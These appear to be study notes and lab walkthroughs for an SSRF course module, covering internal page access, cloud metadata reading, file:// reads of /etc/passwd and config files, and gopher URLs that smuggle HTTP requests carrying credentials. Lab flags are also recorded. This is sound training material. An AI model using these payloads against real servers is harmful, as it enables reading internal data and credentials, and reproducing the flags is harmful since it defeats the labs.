This Learning Unit covers the following Learning Objectives:

1. Understand how to exploit SSRF to retrieve data
2. Understand limitations of SSRF
3. Understand how SSRF can be exploited in cloud environments
4. Become familiar with alternative URI schemes and how they can be used with SSRF

In this Learning Unit, we will focus on how we can exploit SSRF vulnerabilities and what limitations we might encounter. We will start with retrieving data via SSRF.

----------
#### 12.3.1. Retrieving Data

What we can do with an SSRF vulnerability depends on how the application sends the forged request. For example, the user-agent sending the request might not follow redirects. If the application always sends GET requests, we may be limited to retrieving other HTML pages or basic service enumeration.

Let's walk through an example of how to retrieve another page in the SSRF Sandbox.

First, notice that an attempt to access the _Status_ page results in an error message.

![[Pasted image 20241104133103.png]]
The error message states "Remote access denied". Perhaps there are IP restrictions in place that prevent us from accessing the page. Let's try using the SSRF vulnerability to access it. Remember, when we exploit an SSRF vulnerability, the application sends the request on our behalf. If the application checks IP addresses, the request would contain the IP address of the server itself.

We'll click on _Preview Link_, enter `http://localhost/status` in the _URL_ field at `http://ssrf-sandbox/preview` and click _Submit_.

![[Pasted image 20241104133310.png]]

Our SSRF exploit was successful, and we were able to access the contents of the Status page by forcing the application server to request it on our behalf.

Although we can access the Status page, the application we are _sending_ the forged request to may limit our capability. For example, many applications use POST or PUT requests for actions that change state. Those same requests might also require authentication in the form of a session cookie or authorization header. If we can only control the URL field, we may be limited to the default request method generated by the application. Later in this Learning Unit, we will cover some ways to bypass these restrictions based on alternative URL schemes.

##### Labs
1. `OS{throughTheLookingGlass}`
![[Pasted image 20241104133939.png]]
from the `preview` page we see that  Flags as a service is hosted at `10.10.10.3` and the flag is at `/flag`
![[Pasted image 20241104134020.png]]
go to that location i the preview and profit
![[Pasted image 20241104134103.png]]
2. `OS{theTimeHasComeToTalkOfManyThings}`
![[Pasted image 20241104135133.png]]
navigate to the host `backend` using the `ssrf-sandbox/preview` endpoint
![[Pasted image 20241104135012.png]]
use `curl` to grab flag
![[Pasted image 20241104135107.png]]

--------------------
#### 12.3.2. Instance Metadata in Cloud

Server-side Request Forgery can be more impactful in cloud environments. Many cloud providers have internal services that provide configuration _metadata_[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-request-forgery-34430/exploiting-ssrf-34512/instance-metadata-in-cloud-34463#fn-local_id_373-1) to the hosted virtual machines. Most metadata services provide information about the environment or machines in _key:value_ pairs. The virtual machines use metadata to configure themselves. For example, many environments allow developers to include SSH public keys as metadata rather than having to add the keys individually to each server.

Some cloud hosting providers, such as AWS, use the link-local address 169.254.169.254 for their metadata services. Others provide access through DNS, such as Google Cloud, which uses metadata.google.internal.[2](https://portal.offsec.com/courses/web-200-28380/learning/server-side-request-forgery-34430/exploiting-ssrf-34512/instance-metadata-in-cloud-34463#fn-local_id_373-2) The services may also include private credentials that can provide greater access to, or compromise, the cloud environment.

Some metadata services require authentication, usually in the form of a token in a request header. Metadata services that allow modifications to metadata usually use POST or PUT requests. If we are exploiting an SSRF vulnerability that only sends GET requests, we will likely only be able to read metadata values. However, if we are able to update metadata, we may be able to gain access to the environment by adding our own SSH key to the list of allowed public keys.

If we are attacking an application hosted in a cloud environment, determining which environment we are operating in increases our chances of successfully exploiting SSRF to gain access to sensitive metadata by knowing what address and metadata to target.


##### Labs
1.`OS{bewareTheJabberwock}`
![[Pasted image 20241104140359.png]]
start by navigating to the end point referenced in question - the responses dont look like end points but they are
![[Pasted image 20241104140244.png]]
chase the `/latest` endpoint and eventually run into the flag
![[Pasted image 20241104140203.png]]

#### 12.3.2 Bypassing Authentication in Microservices
As we previously discussed, applications running in containers or as microservices will often have fewer security controls. Instead, they rely upon other systems, such as an API gateway or a reverse proxy, to provide security controls before forwarding traffic to the application. If we can exploit a SSRF vulnerability in an application or microservice "behind" the security controls and make it talk directly to another microservice, we can potentially bypass the security controls when interacting with the second microservice.

In other words, any security controls enforced by an API gateway on traffic _entering_ the internal network would not apply to the traffic between the two microservices since the traffic originates _within_ the internal network. In these situations, we can exploit an SSRF vulnerability to gather information about the internal network and open new attack vectors on that network. However, our attacks will be limited by our knowledge of the internal hostnames or the private IP range used by the internal network.

##### Labs
1. `OS{whatAliceFoundThere}`
![[Pasted image 20241104140745.png]]

![[Pasted image 20241104140708.png]]

-------------

#### 12.3.4. Alternative URL Schemes

Depending on the user-agent that generates the forged request, we might be able to use protocols other than HTTP and HTTPS by submitting URLs with different _scheme_ values. A scheme is the first part of a URL that normally precedes a colon (:). For example, in the URL http://www.megacorpone.com, the scheme is "http".

Each scheme has a corresponding _protocol_. Sometimes protocol and scheme are used interchangeably. In the previous example, the scheme is "http", which corresponds to the _Hypertext Transfer Protocol_ (HTTP). The terms seem interchangeable when used to reference HTTP, but there are several different versions of the protocol, such as HTTP/1.0, HTTP/1.1, and HTTP/2.0, that all use the same URL scheme. Generally, the user-agent will specify the HTTP version as part of a request.

When we encounter an SSRF vulnerability, we should also test which protocols and schemes the application will send. Some user-agents will support the _file_[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-request-forgery-34430/exploiting-ssrf-34512/alternative-url-schemes-34456#fn-local_id_556-1) scheme, which allows us to reference files on the vulnerable server. A valid file URI requires a _host_ and a _path_ after the scheme and colon. However, we can also omit the host value by using one forward slash to indicate there is no hostname `(file:/tmp/foo.txt)` or using three forward slashes to indicate an empty hostname `(file:///tmp/foo.txt)`. Most operating systems treat these two options the same, but some might handle them differently.

We can find an example of a file URI in the default homepage of Firefox in Kali.

`file:///usr/share/kali-defaults/web/homepage.html`
![[Pasted image 20241104141640.png]]

In this example, Firefox rendered a file from our local file system with a URI that starts with `file:///`. We can verify this file exists on our local system using head followed by the path.

```bash
kali@kali:~$ head /usr/share/kali-defaults/web/homepage.html        
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Kali Linux</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="Kali Linux is an Advanced Penetration Testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments." />
    <meta name="author" content="Kali Linux" />
    <!-- based on template from http://bootstraptaste.com -->
    <!-- css -->
```

Since we opened the file URI in our browser on our Kali VM, our browser accessed the local file. If we exploit an SSRF with a file URI and the application or command that sends the forged request supports the file scheme, the vulnerable application may access and render a file from its own server.

Let's try an example of this in the SSRF Sandbox. We'll go to the _Preview Link_ page, enter `file:///etc/passwd` in the _URL_ field, leave "Requests Library" selected in the _Utility_ field, and click _Submit_.

![[Pasted image 20241104144310.png]]
The application responded with a generic error message. Without more detail, we must guess what went wrong. Perhaps the application does not support the file scheme, or the server is not a Linux server, which resulted in an invalid file path. However, if we submit a Windows-based file path, such as file:///c:/windows/win.ini, we receive the same error.

Let's try a different utility. We'll change the _URL_ field back to `file:///etc/passwd`, change the _Utility_ field to "curl", and click _Submit_.

![[Pasted image 20241104144430.png]]

Excellent. Curl supports the file scheme, and we were able to retrieve the contents of /etc/passwd from the remote system. As we've discovered, the Python Requests library does not support the file scheme. As this example demonstrates, we need to understand what user agent generates the forged request to determine if we can use alternative URL schemes and increase the severity of the attack.

Some user agents support the _Gopher_[2](https://portal.offsec.com/courses/web-200-28380/learning/server-side-request-forgery-34430/exploiting-ssrf-34512/alternative-url-schemes-34456#fn-local_id_556-2) protocol, which we can use to bypass some of the restrictions of a traditional SSRF vulnerability. Gopher dates to the start of the World Wide Web, but its usage has declined since then.

Curl still supports the Gopher protocol and allows newline characters in URLs. When we use curl to send a request using the Gopher protocol, we can use newlines to inject headers on the request. In fact, we can use Gopher URLs to create valid requests in several different protocols, including HTTP.

Let's try using curl on our Kali VM to familiarize ourselves with Gopher. We'll start a _netcat_ (nc) listener on port 9000.

```bash
kali@kali:~$ nc -nvlp 9000
listening on [any] 9000 ...
```

Now that we have our listener running, we'll open a new terminal tab and call our listener using curl and the gopher: URL scheme.

```bash
kali@kali:~$ curl gopher://127.0.0.1:9000/hello_gopher
```

The terminal window will pause while it waits for a response from the Netcat listener. Let's switch tabs and check the output on the listener.

```
...
listening on [any] 9000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 56264
ello_gopher
```
Our listener received the request, but the first character of the URL path is missing. Our listener will keep the Gopher connection open so we'll need to stop the it with `Ctrl+c`.

Let's try sending an HTTP request in the path of our Gopher URL. We'll need to remember that the first character of the path gets truncated.

Before we demonstrate this, consider this standard curl GET request:

```bash
GET /hello_gopher HTTP/1.1
Host: 127.0.0.1:9000
User-Agent: curl/7.74.0
Accept: */*
```

Let's try to recreate the first line of a normal HTTP GET request. We'll use an underscore as the first character of the path since it gets truncated. We'll need to URL-encode spaces as `%20` to create a valid URL. Our resulting value is `_GET%20/hello_gopher%20HTTP/1.1`. Let's restart our listener and then submit our payload to it using curl.

```bash
kali@kali:~$ curl gopher://127.0.0.1:9000/_GET%20/hello_gopher%20HTTP/1.1
```
Let's check our Netcat listener.
```
...
listening on [any] 9000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 56274
GET /hello_gopher HTTP/1.1
```

The first line of our request now mimics a normal HTTP request. We may need to include additional headers depending on the server processing such a request, and how strictly the server validates it. For example, we may need to include a line feed character (%0a) and a _Host_ header. Since we are including the GET request as part of the path, we can easily change it to a different HTTP method.

Let's try using the Gopher protocol on the SSRF Sandbox. We'll start Burp Suite and open the embedded Chromium browser. Next, we'll access the Preview Link page, select `curl` in the `Utility` field, and enter `gopher://127.0.0.1:80/_GET%20/status%20HTTP/1.1%0a` in the URL field. We need to include port `80` in our URL because the Gopher service normally runs on port `70`. Let's click _Submit_.

payload
```bash
gopher://127.0.0.1:80/_GET%20/status%20HTTP/1.1%0a
```
![[Pasted image 20241104145142.png]]
Excellent. Our Gopher request was interpreted as an HTTP request by the server, and we were able to retrieve the results of the /status page. However, we still sent a `GET` request, which we were already able to do. Let's try changing our payload to send a `POST` request by replacing `GET` with `POST`. We'll enter `gopher://127.0.0.1:80/_POST%20/status%20HTTP/1.1%0a` in the _URL_ field and click _Submit_.

![[Pasted image 20241104145328.png]]
The application responded with an HTTP 405 message indicating the server does not allow POST requests to the `/status` page. Even though we received an error page, this means the server interpreted our Gopher payload as a POST request.

We are missing one important detail. If we tried to replicate this attack using curl on our Kali VM, we would encounter a problem. The application does not receive the exact payload we've entered in our browser. In fact, our browser URL-encodes the percent signs, creating _double encoded_[3](https://portal.offsec.com/courses/web-200-28380/learning/server-side-request-forgery-34430/exploiting-ssrf-34512/alternative-url-schemes-34456#fn-local_id_556-3) values. We can verify this by checking our requests in the _HTTP history_ tab of Burp Suite.

![[Pasted image 20241104145428.png]]
Our browser URL-encoded all non-alphanumeric characters. In the case of the percent sign, this resulted in each space character being double URL-encoded as `"%2520"`. The application essentially processes our request twice. The application first processes it as the request to /preview. This request triggers the SSRF attack, which sends another request, in this case the GET request to 127.0.0.1/status. Since the payload values are double encoded, the application does not fully decoded the payload until it processes the second request.

If we were to replicate this attack from curl or in the Repeater tool of Burp Suite, we would need to double encode any non-alphanumeric characters as well.


##### Labs
1. `OS{theSlythyTovesDidGyreAndGymbleInTheWabe}`
![[Pasted image 20241104153004.png]]
Payload to get config file
```bash
gopher://127.0.0.1:80/_GET%20/status%20HTTP/1.1%0a
```
![[Pasted image 20241104145701.png]]
find information about `/app/config.ini` location
![[Pasted image 20241104145736.png]]
Payload to grab `/app/config.ini`
```bash
file:///app/config.ini
```
![[Pasted image 20241104150725.png]]
create a payload that uses `gopher` payload to grab the `/protectedfile` utilizing the authentication methods of `password` and `apikey`
The Payload
```bash
gopher://127.0.0.1:80/_GET%20/protectedflag%3Fpassword%3Dtwasbryllyg%20HTTP/1.1%0AHost:%20127.0.0.1%0AAuthorization:%20Bearer%20chesirecat%0A%0A
```

![[Pasted image 20241104152724.png]]


Shows how to use Authorization Bearer
https://forum.knime.com/t/get-api-call-using-bearer-token/70535


2.
`OS{followTheWhiteRabbit}`
![[Pasted image 20241104155902.png]]
1st payload attempt: didnt work
```bash
gopher://backend/_POST%20/login%3Fusername%3Dwhite.rabbit%3Fpassword%3Ddontbelate%20HTTP/1.1%0AHost:%20127.0.0.1
```
couldnt get my payload to work due to double encoding:
```bash
gopher://backend:80/_POST%2520/login%2520HTTP/1.1%250AHost:%2520127.0.0.1%250AContent-Type:%2520application/x-www-form-urlencoded%250AContent-Length:%252040%250A%250Ausername=white.rabbit%2526password=dontbelate
```
pulled this very similar payload from discord and it worked:
```bash
gopher://backend:80/_POST%20/login%20HTTP/1.1%0aContent-Type:%20application/x-www-form-urlencoded%0aContent-Length:%2041%0a%0ausername=white.rabbit&password=dontbelate
```

```http
gopher://backend:80/_POST%20/login%20HTTP/1.1%0aContent-Length:%2041%0aContent-Type:%20application/x-www-form-urlencoded%0ausername=white.rabbit&password=dontbelate
```

```http
gopher://backend:80/_POST%20/login%20HTTP/1.1%0AContent-Type:%20application/x-www-form-urlencoded%0aContent-Length:%2050%0Aausername=white.rabbit%0apassword=dontbelate
```
### Issues with the First URL

- The **`Content-Length`** header states `40`, but the actual length of the body (the parameters) is `41` due to the presence of the `&` character instead of `%26`. This mismatch causes issues.
- The `Host` header is likely incorrect or could lead to a misinterpretation of the request.

### Second URL Breakdown (Working)

perl

Copy code

`gopher://backend:80/_POST%20/login%20HTTP/1.1%0aContent-Type:%20application/x-www-form-urlencoded%0aContent-Length:%2041%0a%0ausername=white.rabbit&password=dontbelate`

1. **Single Encoding**:
    
    - This URL is encoded correctly for HTTP transmission.
    - The `%20` (space) and `%0a` (newline) are properly recognized.
2. **Decoding Process**:
    
    - Decoding once gives:
        
        bash
        
        Copy code
        
        `gopher://backend:80/_POST /login HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 41  username=white.rabbit&password=dontbelate`
        
3. **Content-Length**:
    
    - The `Content-Length` header matches the length of the body (`41`), ensuring proper processing by the server.

### Summary

- The first URL fails because of incorrect double encoding that leads to mismatched `Content-Length` and improperly formatted headers.
- The second URL is correctly formatted with a single level of encoding and matches the expected HTTP request structure, allowing it to work as intended.

